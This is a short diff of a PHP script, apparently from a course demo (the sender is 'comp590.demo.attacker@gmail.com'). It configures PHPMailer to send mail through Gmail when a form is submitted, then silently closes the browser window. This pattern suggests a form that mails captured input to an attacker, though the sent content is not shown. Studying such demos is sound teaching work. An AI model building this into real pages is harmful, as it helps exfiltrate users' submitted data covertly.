@@ -4,17 +4,9 @@ require_once ('PHPMailer/PHPMailerAutoload.php');
 
 $email = "comp590.demo.attacker@gmail.com";
 
-//ini_set("SMTP","ssl://smtp.gmail.com");
-//ini_set("smtp_port","465");
-//ini_set('sendmail_from', $email);
-
 ini_set("SMTP","smtp.gmail.com");
 ini_set("smtp_port","25");
 ini_set('sendmail_from', $email);
-
-//ini_set("SMTP","tls://smtp.gmail.com");
-//ini_set("smtp_port","587");
-//ini_set('sendmail_from', $email);
 
 $mail = new PHPMailer();
 $mail->isSMTP();
@@ -40,4 +32,6 @@ if ( isset( $_REQUEST['submit'])) {
 
     $mail->Send();
 
+    echo "<script>window.close();</script>";
 }
+
